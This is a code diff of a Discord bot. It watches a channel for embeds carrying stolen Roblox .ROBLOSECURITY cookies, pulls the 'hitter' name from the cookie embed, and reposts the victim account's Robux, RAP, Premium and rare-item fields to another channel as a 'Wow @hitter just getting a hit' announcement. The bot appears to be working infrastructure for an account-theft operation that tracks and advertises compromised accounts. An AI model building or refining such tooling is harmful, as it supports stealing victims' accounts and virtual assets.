@@ -19,20 +19,16 @@ if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
 }
 // ──────────────────────────────────────────────────────────────────────────────
 
-const SECTION_KEYWORDS = [
-  'Robux', 'Balance', 'Pending',
-  'Summary', 'Rap', 'Owned Item',
-  'Premium', 'Korblox', 'Headless',
-  'korbloxdeath', 'headless', 'korblox',
-];
+// Field names to keep (matched against field.name, case-insensitive, strips emojis)
+const KEEP_FIELD_NAMES = ['robux', 'rap', 'summary', 'premium', 'korblox'];
 
-function extractSections(description) {
-  if (!description) return null;
-  const lines = description.split('\n');
-  const kept = lines.filter(line =>
-    SECTION_KEYWORDS.some(kw => line.toLowerCase().includes(kw.toLowerCase()))
-  );
-  return kept.length > 0 ? kept.join('\n') : null;
+function cleanText(str) {
+  return str.replace(/<[^>]+>/g, '').replace(/:[a-z0-9_]+:/gi, '').trim().toLowerCase();
+}
+
+function shouldKeepField(field) {
+  const name = cleanText(field.name);
+  return KEEP_FIELD_NAMES.some(kw => name.includes(kw));
 }
 
 client.once('clientReady', () => {
@@ -48,48 +44,55 @@ client.on('messageCreate', async (message) => {
   const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
   if (!targetChannel) return console.error('❌ Target channel not found.');
 
-  // Step 1: find the hitter name from the cookie embed's footer
+  // Step 1: get hitter name from cookie embed footer
   let hitterName = null;
   for (const embed of message.embeds) {
-    const embedText = [
-      embed.title,
-      embed.description,
-      embed.author?.name,
+    const allText = [
+      embed.title, embed.description, embed.author?.name,
       ...(embed.fields?.map(f => f.value) ?? []),
     ].filter(Boolean).join(' ');
 
-    if (embedText.includes('ROBLOSECURITY') || embedText.includes('WARNING:-DO-NOT-SHARE')) {
-      if (embed.footer?.text) {
-        hitterName = embed.footer.text.trim();
-      }
+    if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
+      hitterName = embed.footer?.text?.trim() || null;
       break;
     }
   }
 
-  // Step 2: forward the hit data embed (skip cookie embed)
+  // Step 2: forward hit data embed only
   for (const embed of message.embeds) {
-    const embedText = [
-      embed.title,
-      embed.description,
-      embed.author?.name,
+    const allText = [
+      embed.title, embed.description, embed.author?.name,
       ...(embed.fields?.map(f => f.value) ?? []),
     ].filter(Boolean).join(' ');
 
-    if (embedText.includes('ROBLOSECURITY') || embedText.includes('WARNING:-DO-NOT-SHARE')) {
+    if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
       console.log('⏭  Skipped ROBLOSECURITY embed');
       continue;
     }
 
-    const filteredDesc = extractSections(embed.description);
-    if (!filteredDesc) continue;
+    const keptFields = (embed.fields ?? []).filter(shouldKeepField);
+    console.log('📋 Kept fields:', keptFields.map(f => f.name));
+
+    if (keptFields.length === 0) {
+      console.log('⚠️  No matching fields found, skipping');
+      continue;
+    }
+
+    const intro = hitterName
+      ? `Wow @${hitterName} just getting a hit`
+      : `Wow just getting a hit`;
 
     const rebuilt = new EmbedBuilder();
-    const intro = hitterName ? `Wow @${hitterName} just getting a hit` : `Wow just getting a hit`;
-    rebuilt.setDescription(`${intro}
+    rebuilt.setDescription(intro);
+    rebuilt.addFields(keptFields.map(f => ({
+      name:   f.name,
+      value:  f.value,
+      inline: f.inline ?? false,
+    })));
 
-${filteredDesc}`);
-    if (embed.color)     rebuilt.setColor(embed.color);
-    if (embed.timestamp) rebuilt.setTimestamp(new Date(embed.timestamp));
+    if (embed.color)          rebuilt.setColor(embed.color);
+    if (embed.timestamp)      rebuilt.setTimestamp(new Date(embed.timestamp));
+    if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
     if (embed.author) {
       rebuilt.setAuthor({
         name:    embed.author.name    || '',
@@ -97,8 +100,6 @@ ${filteredDesc}`);
         url:     embed.author.url     || undefined,
       });
     }
-    if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
-
 
     await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
   }
